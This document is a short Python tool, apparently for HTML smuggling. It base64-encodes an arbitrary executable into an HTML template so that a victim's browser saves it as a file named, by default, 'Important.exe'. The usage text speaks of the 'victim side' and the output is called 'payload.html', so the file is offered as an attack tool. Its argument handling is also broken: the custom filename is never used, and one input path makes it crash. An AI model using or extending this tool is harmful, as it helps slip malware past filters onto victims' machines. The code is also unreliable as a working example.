import base64
import os, sys


def generate_html(executable_path, output_filename, template_path, download_as_filename="Important.exe"):
    """
    Generates an HTML file that includes the Base64 encoded data
    of the specified executable file.

    :param executable_path: Path to the executable file
    :param output_filename: Name of the output HTML file
    :param template_path: Path to the HTML template file
    """
    try:
        # Read the binary data from the executable file
        with open(executable_path, "rb") as exe_file:
            binary_data = exe_file.read()
    except FileNotFoundError:
        print(f"[!] Executable file '{executable_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading '{executable_path}': {e}")
        sys.exit(1)

    # Base64 encode the binary data
    encoded_data = base64.b64encode(binary_data).decode("utf-8")

    try:
        # Read the template HTML file
        with open(template_path, "r") as template_file:
            template_content = template_file.read()
    except FileNotFoundError:
        print(f"[!] Template file '{template_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading '{template_path}': {e}")
        sys.exit(1)

    # Replace the placeholder in the template with the encoded data
    html_content = template_content.replace("{encoded_data}", encoded_data)
    html_content = html_content.replace("{filename}", download_as_filename)

    try:
        # Write the modified HTML content to the output file
        with open(output_filename, "w") as output_file:
            output_file.write(html_content)
    except Exception as e:
        print(f"[!] Error writing to '{output_filename}': {e}")
        sys.exit(1)


if __name__ == "__main__":
    print(
        """
███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
        """
    )

    # Check command-line arguments
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path_to_executable> <output_filename (optional)> <filename (downloaded at victim side)(optional)>")
        sys.exit(1)

    executable_path = sys.argv[1]
    
    if len(sys.argv) == 2:
        output_filename = os.path.join(os.path.dirname(__file__), "payload.html")
    else:
        output_filename = sys.argv[2]

    template_path = os.path.join(os.path.dirname(__file__), "template.html")

    # Verify if the template file exists
    if not os.path.isfile(template_path):
        print(f"[!] Template file '{template_path}' not found.")
        sys.exit(1)
        
    if len(sys.argv) == 3:
        download_as_filename = "Important.exe"
    else:
        download_as_filename = sys.argv[3]

    # Generate the HTML file
    generate_html(executable_path, output_filename, template_path)
    print(f"[+] HTML file '{output_filename}' generated successfully.")
